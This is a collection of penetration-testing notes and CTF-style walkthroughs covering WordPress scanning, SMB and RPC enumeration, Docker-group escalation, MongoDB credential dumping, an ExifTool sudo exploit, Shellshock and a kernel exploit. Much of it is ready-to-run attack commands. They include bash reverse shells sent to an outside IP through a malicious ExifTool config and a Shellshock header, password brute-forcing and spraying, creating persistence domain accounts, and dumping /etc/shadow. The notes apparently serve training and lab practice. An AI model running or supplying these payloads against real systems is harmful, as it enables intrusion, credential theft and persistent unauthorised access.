items: Located the non-standard SUID binary /usr/sbin/checker
Used 'strings' to identify the getenv('admin') logic gate
Manipulated the shell environment using the export command
Triggered the binary to execute the setuid(0) path
Spawned a root shell and captured the final flag in /root

blocks.text: Comprehensive WordPress Security Scanning (WPScan)

The <highlight>wpscan</highlight> tool is a black-box vulnerability scanner designed specifically for WordPress. It identifies security issues by analyzing the version, installed components, and user-facing metadata.
1. Site Enumeration & Discovery

blocks.code:
# Basic scan for version and general security info
wpscan --url http://blog.thm/

# Enumerate all vulnerable plugins and themes
wpscan --url http://blog.thm/ -e vp,vt

# Enumerate popular plugins and common themes
wpscan --url http://blog.thm/ -e p,t

blocks.text: Using <highlight>-e vp,vt</highlight> is the most common starting point. It filters the noise and only alerts you to plugins or themes with known CVEs (Common Vulnerabilities and Exposures).
2. User Enumeration Techniques

blocks.code:
# Enumerate valid usernames using multiple methods
wpscan --url http://blog.thm/ -e u

# Use a range-based search for user IDs (1 to 20)
wpscan --url http://blog.thm/ -e u1-20

blocks.text: The <highlight>-e u</highlight> flag uses methods like author archives, the REST API, and login feedback to find valid handles such as <highlight>bjoel</highlight> or <highlight>kwheel</highlight>.
3. Password Bruteforce & Credential Attacks

blocks.code:
# Bruteforce a single user with a wordlist
wpscan --url http://blog.thm/ -U kwheel -P /usr/share/wordlists/rockyou.txt

# Bruteforce multiple users simultaneously
wpscan --url http://blog.thm/ -U bjoel,kwheel -P /usr/share/wordlists/rockyou.txt

# Speed up the attack using multiple threads
wpscan --url http://blog.thm/ -U kwheel -P wordlist.txt -t 50

blocks.text: The <highlight>-P</highlight> flag initiates a dictionary attack. Combining this with the <highlight>-t</highlight> (threads) flag increases the speed of attempts per second against the <highlight>xmlrpc.php</highlight> or login interface.
4. Stealth & Efficiency Flags

blocks.code:
# Use a specific User-Agent to bypass simple filters
wpscan --url http://blog.thm/ --user-agent "Mozilla/5.0"

# Bypass basic detection by randomizing the User-Agent
wpscan --url http://blog.thm/ --random-user-agent

# Use an API token to get detailed vulnerability data (WPSec)
wpscan --url http://blog.thm/ --api-token YOUR_TOKEN

blocks.text: Essential Flag Summary

blocks.title: Quick Reference
items: --url: The target WordPress site address
-e / --enumerate: List specific items (u=users, vp=vulnerable plugins, vt=vulnerable themes)
-U: Specify the username(s) to target for login attacks
-P: Path to the password wordlist for bruteforcing
-t: Number of concurrent threads for faster scanning
--api-token: Provides detailed vulnerability descriptions from the WPScan database

blocks.text: Phase 1: Hidden Services Discovery (Internal Enumeration)
First, we checked which services were running inside the machine that were not visible from the outside. We used <highlight>ss -tulnp</highlight> for this purpose.

blocks.code:
# 1. Check all listening ports (TCP/UDP)
ss -tulnp

# 2. Specifically check for port 9999
netstat -tulpn | grep 9999

blocks.title: What is 127.0.0.1?
items: If a port is bound to 127.0.0.1, it is only accessible from within the local machine.
Such services are often 'Internal Dashboards' blocked from external access for security reasons.

blocks.text: Phase 2: Identifying the Service Owner (User Discovery)
We utilized <highlight>/proc/net/tcp</highlight> because 'www-data' cannot see process names in 'netstat -p'. We searched by converting port 9999 into hex (<highlight>270F</highlight>).

blocks.code:
# 1. Find the line corresponding to Port 9999 (270F hex)
cat /proc/net/tcp | grep 270F

# 2. Find the actual username for UID 1002
grep 1002 /etc/passwd

blocks.title: Why is UID 1002 (John) Important?
items: UID 1002 indicates that this specific service is being run by the user 'john'.
If we find RCE (Remote Code Execution) in this service, we will gain John's permissions.

blocks.text: Phase 3: Port Forwarding / Tunneling (Bridging the Access)
To view the internal service in a browser, we used <highlight>socat</highlight> to redirect internal port 9999 to public port 8888.

blocks.code:
# Expose internal port 9999 on port 8888 (Running in background)
socat TCP-LISTEN:8888,fork,reuseaddr TCP:127.0.0.1:9999 &

blocks.title: Benefits of the Tunnel
items: We can now view the GUI dashboard from the Kali browser at http://TARGET_IP:8888.
This allows us to easily test injection filters using Burp Suite.

blocks.text: Phase 4: Current Status & Filtering Obstacles

blocks.title: The Next Challenge
items: Input fields (cmd1, cmd2, cmd3) are returning an 'Invalid Filename' error.
This indicates that the PHP code is likely filtering or blocking specific characters (like ; | &).
Goal: Bypass these filters to obtain a shell as John.

blocks.text: RPCClient: MS-RPC Enumeration Tool

<highlight>rpcclient</highlight> is a powerful tool part of the Samba suite used to interact with <highlight>Microsoft Remote Procedure Call (MS-RPC)</highlight> endpoints. It allows an attacker or tester to execute administrative functions and enumerate sensitive domain information if <highlight>Null Sessions</highlight> or valid credentials are provided.
Establishing a Null Session Connection

The <highlight>-U ""</highlight> flag specifies an empty username, and <highlight>-N</highlight> tells the tool to use no password. This attempts a <highlight>Null Session</highlight> connection, which, if successful, drops you into an interactive <highlight>rpcclient $></highlight> prompt.
Initial Server Reconnaissance

blocks.code:
rpcclient $> srvinfo
      SERVER01       Wk Sv PrQ Unx NT SNT
      platform_id     :   500
      os version      :    10.0
      server type     :   0x809a03

blocks.text: The <highlight>srvinfo</highlight> command reveals the server's hostname, platform ID, and OS version, helping to identify the target as Windows or a Linux Samba server.
Enumerating Domain & Local Users

blocks.code:
user:[m.abbasi] rid:[0x451]
user:[guest] rid:[0x1f5]
user:[administrator] rid:[0x1f4]

blocks.text: The <highlight>enumdomusers</highlight> command pulls a list of all users from the SAM database. Each user is associated with a <highlight>Relative Identifier (RID)</highlight>, which is essential for further targeted queries.
Manual RID Enumeration & Brute-forcing

If <highlight>enumdomusers</highlight> returns an empty list, you must manually brute-force RIDs. Standard RIDs: <highlight>500</highlight> (Administrator), <highlight>501</highlight> (Guest), <highlight>1000+</highlight> (Normal Users).
Handling Enumeration Failures (NT_STATUS)

blocks.code:
result was NT_STATUS_NO_SUCH_USER  # User does not exist at this RID
result was NT_STATUS_ACCESS_DENIED  # Permissions blocked (Needs valid creds)

blocks.text: If you get <highlight>NT_STATUS_NO_SUCH_USER</highlight>, move to the next RID (e.g., 1002, 1003). In Linux/Samba, RIDs can sometimes start in much higher ranges like <highlight>3000+</highlight>.
Querying Specific User Details

By using <highlight>queryuser [RID]</highlight>, you can extract specific details such as the user's <highlight>full name</highlight>, password last set time, account expiry, and <highlight>description</highlight> (which often contains default passwords in HTB labs).
Enumerating Local Groups (Aliases)

blocks.code:
rpcclient $> enumalsgroups domain
rpcclient $> queryaliasmem builtin 0x220

blocks.text: The <highlight>enumalsgroups domain</highlight> command lists local groups (aliases). Using <highlight>queryaliasmem</highlight> with a RID (like 0x220 for Local Administrators) reveals members of that specific local group.
Enumerating Domain Groups
<highlight>enumdomgroups</highlight> lists all domain groups. To see which users belong to a group (like Domain Admins), use <highlight>querygroupmem</highlight> with the group's RID.
Extracting Password Policy

blocks.code:
rpcclient $> getdompwinfo
Password Complexity: Disabled
Minimum Password Length: 7
Password History Length: 0

blocks.text: The <highlight>getdompwinfo</highlight> command is crucial for preparing a brute-force attack. It tells you the minimum password length and complexity requirements.
Enumerating Network Shares
While smbclient also lists shares, <highlight>netshareenumall</highlight> provides a detailed view of all available shares including hidden ones (ending with $).
Post-Exploitation: User Creation

blocks.code:
rpcclient $> createdomuser hacker_azid
rpcclient $> setuserinfo2 hacker_azid 24 "Password123!"

blocks.text: With high-privileged credentials, you can create new domain users for persistence. <highlight>setuserinfo2</highlight> is then used to set the password for the newly created account.
Advanced Enumeration (Printers & LSA)
<highlight>enumprinters</highlight> helps identify potential PrintNightmare targets, while <highlight>lsaquery</highlight> reveals the Domain SID, essential for advanced Active Directory attacks.
SID Lookup and Translation

blocks.code:
rpcclient $> lookupnames administrator
rpcclient $> lookupsids S-1-5-21-123456789-1001

blocks.text: These commands allow you to translate <highlight>usernames to SIDs</highlight> and vice versa, which is vital for manual RID Cycling.
Summary of RPCClient Capabilities

blocks.title: Data Retrievable via RPCClient
items: Confirm Null Session vulnerability
List all local and domain usernames via listing or manual RID bruting
Extract user descriptions and last login times
Enumerate local aliases and domain group memberships
Identify system password complexity and length requirements
Discover hidden network shares and printer services
Perform SID to Name translations and retrieve Domain SIDs
Create persistence accounts if administrative access is granted

blocks.text: CrackMapExec (CME) - SMB Post-Exploitation

<highlight>CrackMapExec</highlight> is a multi-threaded tool used to enumerate and exploit SMB services across entire networks. It is the fastest way to check for <highlight>Null Sessions</highlight>, password spraying, and finding sensitive data across multiple IPs.
Network Enumeration & Null Sessions

This command scans a whole CIDR range for <highlight>Null Sessions</highlight>. The <highlight>--shares</highlight> flag lists all accessible shares. If you see <highlight>READ</highlight> permissions on a share without a password, it's a confirmed entry point.
User Discovery via RID Bruting

When you have no usernames, use <highlight>--rid-brute</highlight> to query the SAM database via RPC. It iterates through Relative Identifiers (RIDs) to extract a full list of valid local or domain users from the target.
Password Spraying & Authentication

Use a list of discovered usernames to test a single common password. The <highlight>--continue-on-success</highlight> flag ensures the tool doesn't stop after the first valid credential, allowing you to map all compromised accounts.
Automated Content Spidering

The <highlight>--spider</highlight> flag allows you to search a specific share for interesting files. Using <highlight>--regex</highlight> filters the results for filenames containing 'pass', 'user', or 'config', making it easy to find high-value targets quickly.
Command Execution (Requires Admin)
If you have administrative credentials, the <highlight>-x</highlight> flag executes commands on the target system. This is often used to check for high privileges or to disable security features.

blocks.title: CME Power User Tips
items: Use --pass-pol to check the domain password lockout policy before spraying
Check for --sam or --lsa to dump credentials if you have local admin rights
Use --groups to see which users belong to 'Domain Admins'
Use --local-auth if you are targeting a local account rather than a domain account

blocks.text: Phase 2: Privilege Escalation via Docker Group

Membership in the <highlight>docker</highlight> group is a critical security misconfiguration. Since the Docker daemon runs with <highlight>root</highlight> privileges, any user in this group can interact with the daemon to mount the entire host filesystem into a container, effectively bypassing all OS-level permission controls.
Step 1: Identifying Group Membership

We use the <highlight>id</highlight> or <highlight>groups</highlight> command to check if the current user has permissions to interact with the Docker socket. If 'docker' appears in the output, the escalation path is confirmed.

blocks.code:
# Check current user groups
id
# or
groups

blocks.text: Step 2: Mounting the Host Filesystem

We run a container and use the <highlight>-v /:/mnt</highlight> flag to mount the host's root directory into the container's <highlight>/mnt</highlight> folder. By using <highlight>chroot</highlight>, we shift our shell's root to this mount point, giving us full access to the host as root.

blocks.code:
# Escape to host root via Docker container
docker run -v /:/mnt -it bash chroot /mnt sh

blocks.text: Step 3: Post-Exploitation & Data Recovery
Once the container starts, we are operating with <highlight>UID 0</highlight>. We can now access protected files like <highlight>/etc/shadow</highlight> or private files in the root home directory.

blocks.code:
# Confirm root and capture flag
whoami
cat /root/private.txt
cat /etc/shadow

blocks.title: Exploit Takeaways
items: Vulnerability: Insecure group assignment (Non-admin user in docker group)
Discovery: Always check group memberships during local enumeration
Technique: Filesystem mounting allows complete bypass of host-based access controls
Defense: Limit docker group access; use the Docker socket only via sudo or root

blocks.text: Phase 1: Internal Database Enumeration (Native MongoDB Shell)

Once internal enumeration confirms <highlight>MongoDB</highlight> is listening on <highlight>127.0.0.1:27017</highlight>, the most efficient way to extract data is by spawning a native <highlight>mongo shell</highlight>. This allows for direct interaction with the database engine to find administrative users and credentials.
Step 1: Connecting to Localhost Instance
We attempt to connect to the local MongoDB instance. If the binary is present, we can access the database without credentials if no authentication is enabled for local connections.

blocks.code:
# Connect to the local MongoDB instance
mongo --host 127.0.0.1

blocks.text: Step 2: Enumerating Databases

Using the <highlight>show dbs</highlight> command, we list all available databases on the server. We specifically look for non-standard databases like <highlight>cockpit</highlight> that likely contain application-specific data.
Step 3: Selecting the Database and Listing Collections
We switch context to the target database and use <highlight>show collections</highlight> (equivalent to show tables in SQL) to see the underlying data structures.

blocks.code:
> use cockpit
switched to db cockpit
> show collections

blocks.text: Step 4: Extracting User Credentials

We query the <highlight>accounts</highlight> collection using the <highlight>.find().pretty()</highlight> method. This retrieves all documents in a readable format, revealing the username and bcrypt password hash for the system user.
Step 5: Fallback - Interaction via Python (No-Binary Environment)

If the <highlight>mongo</highlight> binary is missing, we use a <highlight>Python3</highlight> one-liner with the <highlight>pymongo</highlight> library to manually execute the same database enumeration tasks.

blocks.code:
# Show Databases
python3 -c "import pymongo; c = pymongo.MongoClient('mongodb://127.0.0.1:27017/'); print(c.list_database_names())"

# Show Collections (Tables)
python3 -c "import pymongo; c = pymongo.MongoClient('mongodb://127.0.0.1:27017/'); db = c['cockpit']; print(db.list_collection_names())"

# Dump Collection Data
python3 -c "import pymongo; c = pymongo.MongoClient('mongodb://127.0.0.1:27017/'); db = c['cockpit']; print(list(db['accounts'].find()))"

blocks.title: Post-Exploitation Takeaways
items: Discovery: Services on 127.0.0.1 often bypass external security policies
Commands: Use 'show dbs', 'use [db]', and 'show collections' for fast enumeration
Technique: Always check for local 'No-Auth' configurations in MongoDB
Fallback: Use Python 'pymongo' if native client binaries are unavailable

blocks.text: Phase 1: Privilege Escalation via ExifTool (CVE-2021-22204)

Identifying a binary like <highlight>exiftool</highlight> in the <highlight>sudo -l</highlight> output is a major privilege escalation vector. Versions prior to <highlight>12.24</highlight> are vulnerable to a command injection flaw where user-supplied metadata is improperly handled by a Perl <highlight>eval()</highlight> function.
Step 1: Checking Sudo Permissions and Version
We first check our sudo privileges to see if we can run the binary as root. Then, we verify the version to confirm it is within the vulnerable range for <highlight>CVE-2021-22204</highlight>.

blocks.code:
# Check sudo permissions
sudo -l

# Check ExifTool version
/usr/local/bin/exiftool -ver

blocks.text: Step 2: Crafting the Malicious Config File

By using a custom <highlight>.config</highlight> file, we can inject a Perl <highlight>BEGIN</highlight> block. This block executes immediately when ExifTool loads the configuration, allowing us to trigger a reverse shell as the root user before the tool even begins parsing an image.

blocks.code:
# Create a config file that spawns a reverse shell
echo 'BEGIN { system("bash -c \"bash -i >& /dev/tcp/192.168.192.228/4441 0>&1\"") }' > /tmp/shell.config

blocks.text: Step 3: Triggering the Root Shell

We execute <highlight>exiftool</highlight> with <highlight>sudo</highlight> and point it to our malicious config file. We provide a dummy file (like /etc/passwd) as an argument to satisfy the tool's requirements while our payload executes in the background.

blocks.code:
# Execute with sudo to catch the root shell
sudo /usr/local/bin/exiftool -config /tmp/shell.config /etc/passwd

blocks.title: ExifTool Exploit Takeaways
items: Vulnerability: CVE-2021-22204 (Improper input validation in DjVu/Perl processing)
Discovery: Look for 'exiftool' in sudo -l or custom SUID lists
Technique: Using the '-config' flag to execute arbitrary Perl code during initialization
Advantage: The 'BEGIN' block bypasses the need for a valid image or specific metadata tags

blocks.text: Phase 1: Vulnerability Discovery (Manual Enumeration)

When <highlight>Nikto</highlight> is banned (CPTS style), use <highlight>ffuf</highlight> to find CGI directories. Look for <highlight>/cgi-bin/</highlight> and fuzz for <highlight>.cgi</highlight> or <highlight>.sh</highlight> extensions. These scripts often interact with <highlight>Bash</highlight>, making them targets for Shellshock.
Phase 2: Shellshock Manual Exploitation

The payload <highlight>() { :; };</highlight> exploits a bug where Bash continues executing code after a function definition. We inject this into the <highlight>User-Agent</highlight> header because the web server passes this header to the CGI script as an environment variable.

blocks.code:
# 1. Verify RCE with absolute paths
curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://10.10.10.10/cgi-bin/test.cgi

# 2. Get Reverse Shell
curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" http://10.10.10.10/cgi-bin/test.cgi

blocks.text: The <highlight>echo;</highlight> command is critical; it provides the necessary blank line in the HTTP response. Without it, the server returns a <highlight>500 Internal Server Error</highlight> even if the command executes.
Phase 3: Troubleshooting the Environment (Broken GCC)

On older systems, <highlight>gcc</highlight> might fail with <highlight>error trying to exec 'cc1'</highlight>. This happens when the compiler's internal components are not in the <highlight>$PATH</highlight>. You must locate <highlight>cc1</highlight> manually and update the environment.

blocks.code:
# Find the hidden compiler component
find / -name cc1 2>/dev/null

# Example output: /usr/lib/gcc/x86_64-linux-gnu/4.8/cc1
# Add the DIRECTORY (not the file) to PATH
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8/

blocks.text: Phase 4: Advanced Compilation (Matching LDD/GLIBC)

If <highlight>gcc</highlight> is missing on target, check the <highlight>ldd --version</highlight> to find the <highlight>GLIBC</highlight> version. To avoid 'GLIBC not found' errors, compile the exploit in a matching <highlight>Docker container</highlight> (e.g., Ubuntu 14.04) or use the <highlight>-static</highlight> flag to bundle all libraries.

blocks.code:
# On Attacker Machine (Matching Target OS)
docker run -it --name exploit_build ubuntu:14.04 /bin/bash

# Inside Container
apt update && apt install gcc -y
gcc exploit.c -o exploit_matched

# On Attacker (Static Alternative)
gcc exploit.c -o exploit_static -static

blocks.text: Phase 5: Privilege Escalation (The '0day' Path)

Systems vulnerable to Shellshock (circa 2014) often run outdated kernels like <highlight>3.13.0</highlight>. The <highlight>OverlayFS</highlight> exploit (CVE-2015-1328) allows a local user to escalate to <highlight>root</highlight> by exploiting improper permission handling in mount namespaces.

blocks.code:
# Identify Kernel
uname -a

# Transfer and Compile (since PATH is now fixed)
gcc 37292.c -o exploit
chmod +x exploit
./exploit

# Verify Root
whoami
id

blocks.title: Post-Exploitation Checklist
items: Always use Absolute Paths (/usr/bin/id) in Shellshock because the PATH variable might be empty.
Check /etc/lsb-release to confirm the Ubuntu version before picking a Kernel exploit.
If GCC is missing, check GLIBC version (ldd --version) and use a matching Docker container for compilation.
Upgrade your shell to a TTY (python3 pty.spawn) to handle interactive exploit prompts.
Capture the flag at /root/root.txt and /home/ryan/user.txt.
